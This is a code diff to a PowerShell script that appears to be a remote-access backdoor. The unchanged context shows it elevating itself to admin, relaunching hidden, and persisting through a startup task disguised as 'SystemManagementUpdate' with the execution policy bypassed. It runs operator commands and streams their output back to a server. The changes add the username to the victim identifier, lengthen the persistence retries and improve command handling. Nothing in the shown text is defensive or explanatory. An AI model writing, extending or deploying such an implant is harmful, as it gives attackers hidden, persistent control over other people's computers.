@@ -5,7 +5,7 @@ $retryCount = 0
 $maxRetries = 10
 $cmdTimeout = 300   # default timeout — use 'notimeout:' prefix or 'cancel' for manual control
 $maxChunkBytes = 32000  # cap per-chunk size
-$clientId = $env:COMPUTERNAME  # unique identifier sent to server on every request
+$clientId = "$($env:COMPUTERNAME)-$($env:USERNAME)"  # unique identifier sent to server on every request
 
 # --- Self-elevate to admin and relaunch hidden ---
 $currentPrincipal = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
@@ -17,7 +17,7 @@ if (-not $currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Adm
 # --- Persistence ---
 $action = New-ScheduledTaskAction -Execute "PowerShell.exe" -Argument "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$PSCommandPath`""
 $trigger = New-ScheduledTaskTrigger -AtStartup
-$settings = New-ScheduledTaskSettingsSet -RestartCount 3 -RestartInterval (New-TimeSpan -Seconds 10) -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries
+$settings = New-ScheduledTaskSettingsSet -RestartCount 5 -RestartInterval (New-TimeSpan -Seconds 30) -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries
 Register-ScheduledTask -TaskName "SystemManagementUpdate" -Action $action -Trigger $trigger -Settings $settings -Force | Out-Null
 
 # --- Logging ---
@@ -51,9 +51,10 @@ function Send-Http {
     $req.Timeout = $TimeoutMs
     $req.ReadWriteTimeout = $TimeoutMs
     if ($Method -eq "POST" -and $Body) {
-        # Truncate oversized body
-        if ($Body.Length -gt $maxChunkBytes) {
-            $Body = $Body.Substring(0, $maxChunkBytes) + "`n[...truncated]"
+        # Truncate oversized body (byte-based, not character-based)
+        $bodyBytes = [System.Text.Encoding]::UTF8.GetBytes($Body)
+        if ($bodyBytes.Length -gt $maxChunkBytes) {
+            $Body = [System.Text.Encoding]::UTF8.GetString($bodyBytes, 0, $maxChunkBytes) + "`n[...truncated]"
         }
         $bytes = [System.Text.Encoding]::UTF8.GetBytes($Body)
         $req.ContentType = "text/plain; charset=utf-8"
@@ -114,13 +115,17 @@ function Invoke-CommandStreaming {
         $noTimeout = $true
     }
 
-    # 1) Send header immediately so operator knows the command was received
+    # 1) Send header — read cwd from persistent runspace (reflects cd changes)
     $timeoutLabel = if ($noTimeout) { "no-timeout" } else { "${Timeout}s" }
-    $header = "PS " + (Get-Location).Path + "> " + $Command + " [$timeoutLabel]`n"
+    $runspace = Get-PersistentRunspace
+    try {
+        $cwd = [powershell]::Create().AddScript('(Get-Location).Path').Invoke() | ForEach-Object { $_.ToString() }
+        if (-not $cwd) { $cwd = (Get-Location).Path }
+    } catch { $cwd = (Get-Location).Path }
+    $header = "PS $cwd> $Command [$timeoutLabel]`n"
     Send-Stream-To-Server -Body $header
 
     # 2) Use persistent runspace (reused across commands)
-    $runspace = Get-PersistentRunspace
     $ps = [powershell]::Create()
     $ps.Runspace = $runspace
 
